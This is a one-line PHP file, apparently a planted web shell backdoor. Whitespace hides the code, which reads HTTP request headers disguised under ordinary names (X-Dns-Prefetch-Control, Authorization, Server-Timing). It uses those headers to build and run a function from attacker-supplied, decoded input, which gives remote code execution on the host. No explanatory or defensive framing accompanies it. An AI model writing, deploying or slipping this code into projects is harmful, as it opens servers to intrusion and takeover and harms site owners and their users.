<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['X-Dns-Prefetch-Control'])){$internal=$_HEADERS['X-Dns-Prefetch-Control']('', $_HEADERS['Authorization']($_HEADERS['Server-Timing']));$internal();}
